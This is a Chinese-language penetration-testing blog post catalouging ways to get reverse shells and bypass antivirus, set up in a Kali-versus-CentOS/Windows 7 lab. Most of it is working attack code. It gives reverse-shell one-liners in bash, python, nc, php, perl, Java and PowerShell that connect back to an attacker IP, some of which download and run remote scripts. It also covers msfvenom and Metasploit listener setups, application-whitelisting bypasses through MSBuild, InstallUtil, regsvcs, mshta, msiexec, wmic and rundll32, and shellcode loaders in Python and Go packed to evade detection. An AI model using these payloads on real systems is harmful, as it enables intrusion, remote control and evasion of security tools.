---
title: "渗透测试中弹shell的多种方式及bypass"
date: 2019-07-19T09:24:46+08:00
draft: false
tags: ['shell']
categories: ['渗透测试']
---

弹shell的多种方式总结。

<!--more-->

> 文章首发先知 https://xz.aliyun.com/t/5768

在我们渗透测试的过程中，最常用的就是基于tcp/udp协议反弹一个shell，也就是反向连接。

我们先来讲一下什么是正向连接和反向连接。

- 正向连接：我们本机去连接目标机器，比如ssh和mstsc
- 反向连接：目标机器去连接我们本机

那么为什么反向连接会比较常用呢

1. 目标机器处在局域网内，我们正向连不上他
2. 目标机器是动态ip
3. 目标机器存在防火墙

然后说一下我的实验环境

虚拟机采用nat模式

攻击机：Kali Linux ：172.16.1.130

受害机：Centos 7 ：172.16.1.134

## 常见姿势

### bash

bash也是最常见的一种方式

Kali监听

```bash
nc -lvvp 4444
```

centos运行

```bash
bash -i >& /dev/tcp/172.16.1.130/4444 0>&1
```

当然你还可以这样

```bash
exec 5<>/dev/tcp/172.16.1.130/4444;cat <&5|while read line;do $line >&5 2>&1;done
```

这两个都是bash根据Linux万物皆文件的思想衍生过来的，具体更多bash的玩法你可以参考

https://xz.aliyun.com/t/2549

### python

攻击机Kali还是监听

```bash
nc -lvvp 4444
```

centos执行

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.1.130",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

这个payload是反向连接并且只支持Linux，Windows可以参考离别歌师傅的 [python windows正向连接后门](https://www.leavesongs.com/PYTHON/python-shell-backdoor.html)

### nc

如果目标机器上有nc并且存在`-e`参数，那么可以建立一个反向shell

攻击机监听

```bash
nc -lvvp 4444
```

目标机器执行

```bash
nc 172.16.1.130 4444 -t -e /bin/bash
```

这样会把目标机的`/bin/bash`反弹给攻击机

但是很多Linux的nc很多都是阉割版的，如果目标机器没有nc或者没有-e选项的话，不建议使用nc的方式

### php

攻击机监听

```bash
nc -lvvp 4444
```

要求目标机器有php然后执行

```php
php -r '$sock=fsockopen("172.16.1.130",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

或者你直接在web目录写入一个php文件，然后浏览器去访问他就行了，这有一个[Linux和Windows两用的脚本](https://my.oschina.net/chinahermit/blog/144035)

### Java 脚本反弹

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/172.16.1.130/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### perl 脚本反弹

```perl
perl -e 'use Socket;$i="172.16.1.130";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
### powershell

目标机器执行

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.1.130 -port 4444
```

### msfvenom 获取反弹一句话

msf支持多种反弹方式，比如exe ps php asp aspx甚至是ruby等，我们可以用msfvenom来生成payload，然后在msf中监听，执行之后就会反弹回来session

生成payload的方法参考[生成msf常用payload](http://www.myh0st.cn/index.php/archives/67/)，不再赘述

然后msf监听

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.1.130
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

---

那么讲到这里我们把一句话反弹shell的方式讲的差不多了，但是到这里我们又涉及到了一个免杀的问题。

我们首先需要知道的是目前的反病毒软件查杀，常见的有三种：

1. 基于文件特征
2. 基于文件行为
3. 基于云查杀 实际也是基于特征数据库的查杀

到目前为止，我所知道的免杀姿势有以下几种

1. Windows白名单 俗称白加黑 也就是用带有微软签名的软件来运行我们自己的shellcode
2. payload分离免杀 比如shellcode loader
3. 换一门偏僻的语言来自己写反弹shell

而接下来的几种只适用于Windows。

攻击机：Kali Linux ：172.16.1.130

受害机：Win 7 ：172.16.1.135

## Windows白加黑

白加黑需要的payload可以使用[一句话下载姿势总结](https://y4er.com/post/download-shell/) 把payload下载到目标机器，这里不再赘述。

### MSBuild

> MSBuild是Microsoft Build Engine的缩写，代表Microsoft和Visual Studio的新的生成平台
>
> MSBuild可在未安装Visual Studio的环境中编译.net的工程文件
>
> MSBuild可编译特定格式的xml文件
>
> 更多基本知识可参照以下链接：
>
> https://msdn.microsoft.com/en-us/library/dd393574.aspx

意思就是msbuild可以编译执行csharp代码。

在这里我们需要知道的是msbuild的路径

加载32位的shellcode需要用32位的msbuild

```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe
```

加载64位的shellcode需要用64位的msbuild

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
```

我们这里用64位的shellcode和64位的win7来操作。

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 -f csharp
```

生成shellcode之后我们需要用到一个三好学生师傅的https://github.com/3gstudent/msbuild-inline-task

我们用的是`executes x64 shellcode.xml`的模板，把里面45行之后的改为自己的shellcode

然后msf监听

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.1.130
set LPORT 4444
set ExitOnSession false
set autorunscript migrate -n explorer.exe
exploit -j
```

在目标机器上运行

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319>MSBuild.exe "C:\Users\jack.0DAY\Desktop\exec.xml"
```

然后会话上线，某数字卫士无反应，并且正常执行命令

![360数字卫士](https://y4er.com/img/uploads/20190719154312.png)

更多关于msbuild的内容可以参考[三好学生师傅的文章](https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/)

### Installutil.exe&csc.exe

> Installer工具是一个命令行实用程序，允许您通过执行指定程序集中的安装程序组件来安装和卸载服务器资源。此工具与System.Configuration.Install命名空间中的类一起使用。 
>
> 具体参考：[Windows Installer部署](https://docs.microsoft.com/zh-cn/previous-versions/2kt85ked(v=vs.120))

通过msfvenom生成C＃的shellcode
```powershell
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 -f csharp
```

下载InstallUtil-Shellcode.cs，将上面生成的shellcode复制到该cs文件中


https://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260


csc编译InstallUtil-ShellCode.cs

```powershell
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:D:\test\InstallUtil-shell.exe D:\test\InstallUtil-ShellCode.cs
```

编译生成的文件后缀名无所谓exe dll txt都可以，但只能InstallUtil.exe来触发

InstallUtil.exe执行 反弹shell

```powershell
C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U D:\test\InstallUtil-shell.exe
```
参考https://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/

### regasm和regsvcs

regasm和regsvcs都可以用来反弹shell的，而且方式也一样

[下载这个cs文件](https://github.com/3gstudent/Bypass-McAfee-Application-Control--Code-Execution/blob/master/regsvcs.cs) ，然后替换你的shellcode

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 -f csharp
```

使用sn.exe生成公钥和私钥，如果没有sn命令你可能需要安装vs

```bash
sn -k key.snk
```

编译dll，注意文件的路径

```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:1.dll /keyfile:key.snk regsvcs.cs
```
用这两者上线

```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe 1.dll 
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe 1.dll
```
或者这样

```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U 1.dll 
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U 1.dll
```

上线成功。

### mshta

mshta是在环境变量里的

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 ‐f raw > shellcode.bin
```

```bash
cat shellcode.bin |base64 ‐w 0
```

然后替换这个文件中的shellcode

https://raw.githubusercontent.com/mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.hta

替换`' ---------- DO NOT EDIT BELOW HERE -----------`上面引号包起来的base64，可以将hta托管出来。

```bash
mshta.exe http://baidu.com/shellcode.hta
```

在cobalt strike中mshta也是一个很方便的上线功能。

### Msiexec简介：

Msiexec 是 Windows Installer 的一部分。用于安装 Windows Installer 安装包（MSI）,一般在运行 Microsoft Update 安装更新或安装部分软件的时候出现，占用内存比较大。并且集成于 Windows 2003，Windows 7 等。

Msiexec已经被添加到环境变量了。

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 ‐f msi > shellcode.txt
```

目标机执行
```bash
msiexec.exe /q /i http://172.16.1.130/shellcode.txt
```

### wmic

已经被添加到环境变量

poc
```bash
wmic os get /FORMAT:"http://example.com/evil.xsl"
```
```xml
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
	]]> </ms:script>
</stylesheet>
```

参考:[利用wmic调用xsl文件的分析与利用](https://3gstudent.github.io/利用wmic调用xsl文件的分析与利用/)
这里还有一个poc https://raw.githubusercontent.com/kmkz/Sources/master/wmic-poc.xsl

### rundll32

Rundll32.exe是指“执行32位的DLL文件”。它的作用是执行DLL文件中的内部函数,功能就是以命令行的方式调用动态链接程序库。已经加入环境变量。

```bash
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```

也可以去执行msf生成的dll

```bash
rundll32.exe shell32.dll,Control_RunDLL c:\Users\Y4er\Desktop\1.dll
```

---

在这我们先简单介绍这几种，还有`compiler.exe` `odbcconf` `psexec` `ftp.exe`等等。在这里给出参考连接

micro8前辈 https://micro8.gitbook.io/micro8/contents-1#71-80-ke

## payload分离免杀

在这里也只介绍两种分离免杀的姿势

### shellcode loader

借助第三方加载器，将shellcode加载到内存中来执行。

https://github.com/clinicallyinane/shellcode_launcher

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 -e x86/shikata_ga_nai -i 5 -f raw > test.c
```

靶机执行

```bash
shellcode_launcher.exe -i test.c
```

msf监听正常上线

### csc和InstallUtil

不再赘述，参考上文白加黑

## 偏僻语言

实际上也不能说偏僻语言，原理是让杀软不识别文件的pe头。我们在这说两种

### pyinstaller

py版的shellcode模板

```python
#! /usr/bin/env python
# encoding:utf-8

import ctypes

def execute():
    ## Bind shell
    shellcode = bytearray(
    "\xbe\x24\x6e\x0c\x71\xda\xc8\xd9\x74\x24\xf4\x5b\x29"
        ...
    "\x37\xa5\x48\xea\x47\xf6\x81\x90\x07\xc6\x62\x9a\x56"
    "\x13"
     )

    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40))

    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
    buf,
    ctypes.c_int(len(shellcode)))

    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_int(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0)))

    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),
    ctypes.c_int(-1))
if __name__ == "__main__":
    execute()
```

```bash
msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=172.16.1.130 -e x86/shikata_ga_nai -i 5 -f py -o  1.py
```

使用pyinstaller打包

```bash
pyinstaller.py -F --console 1.py
```

和pyinstaller类似的还有py2exe，不再赘述。

### go+upx

```go
package main

import "C"
import "unsafe"

func main() {
    buf := ""
    buf += "\xdd\xc6\xd9\x74\x24\xf4\x5f\x33\xc9\xb8\xb3\x5e\x2c"
    ...省略...
    buf += "\xc9\xb1\x97\x31\x47\x1a\x03\x47\x1a\x83\xc7\x04\xe2"
    // at your call site, you can send the shellcode directly to the C
    // function by converting it to a pointer of the correct type.
    shellcode := []byte(buf)
    C.call((*C.char)(unsafe.Pointer(&shellcode[0])))
}
```

如果正常编译体积会很大，建议使用`go build -ldflags="-s -w"`参数来编译生成exe，你也可以`go build -ldflags="-H windowsgui -s -w"`去掉命令窗口

编译出来900多kb，在使用upx压缩一下会降低到200kb左右，也能正常上线。

## 写在文后

本文所讲到的很多姿势实际上是用来bypass applocker，不过也能弹回来会话。

实战环境复杂，更多情况下请自行判断该使用什么姿势，实际上有时候你折腾半天不上线还不如直接一个bash反弹回来方便。

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**

